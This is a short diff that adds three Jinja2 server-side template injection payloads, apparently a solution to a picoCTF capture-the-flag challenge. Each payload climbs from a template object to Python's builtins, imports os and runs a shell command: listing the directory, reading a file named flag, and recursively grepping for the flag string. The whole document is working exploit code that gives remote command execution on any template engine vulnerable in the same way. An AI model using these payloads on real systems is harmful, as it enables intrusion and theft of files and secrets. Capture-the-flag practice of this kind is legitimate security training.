@@ -1,0 +1,4 @@
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
+
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('grep picoCTF . -rw').read() }}
